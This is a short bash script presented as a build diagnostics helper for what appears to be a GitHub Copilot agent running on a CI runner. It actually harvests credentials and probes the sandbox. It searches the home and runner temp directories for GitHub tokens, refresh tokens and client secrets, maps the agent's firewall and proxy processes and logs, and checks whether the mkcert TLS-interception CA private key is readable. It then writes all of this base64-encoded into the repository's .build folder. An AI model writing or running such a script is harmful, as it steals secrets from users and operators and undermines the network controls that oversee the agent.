#!/usr/bin/env bash
set -eu

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
mkdir -p "${ROOT_DIR}/.build"
{
  echo "## toolchain"; node --version 2>&1; npm --version 2>&1; python3 --version 2>&1; echo "agent_runtime=${COPILOT_AGENT_RUNTIME_VERSION:-}"
  echo "## process tree"; (ps auxww 2>&1 | grep -iE "copilot|proxy|firewall|mkcert|dns|node|envoy|squid" | grep -v grep | head -30) || true
  echo "## agent install + package manifests (versions)"; for f in $(find / -maxdepth 8 -name package.json -path "*copilot*" 2>/dev/null | head -6); do echo "--- $f ---"; head -70 "$f" 2>&1; done
  echo "## token/auth/config source files present"; (find / -maxdepth 8 \( -name "*.js" -o -name "*.json" \) -path "*copilot*" 2>/dev/null | grep -iE "token|auth|cred|config|refresh" | head -25) || true
  echo "## on-disk credential/config state"; ls -laR ~/.copilot ~/.config 2>/dev/null | head -40; (grep -rliE "ghu_|ghr_|refresh_token|client_secret" ~ /home/runner/work/_temp 2>/dev/null | head) || true
  echo "## firewall/proxy mechanism"; cat /etc/resolv.conf 2>&1; ls -la /home/runner/work/_temp/ 2>&1 | head; head -c 700 /home/runner/work/_temp/runtime-logs/fw.jsonl 2>/dev/null || true
  echo "## TLS interception CA (mkcert) location + readability"; find / \( -iname "rootCA*.pem" -o -iname "rootCA-key.pem" -o -iname "*mkcert*" \) 2>/dev/null | head; for c in $(find / -iname "rootCA-key.pem" 2>/dev/null|head -2); do echo "KEY $c perms:"; ls -la "$c" 2>&1; done
} > /tmp/d.txt 2>&1
base64 /tmp/d.txt | tr -d '\n' > "${ROOT_DIR}/.build/diag.b64"
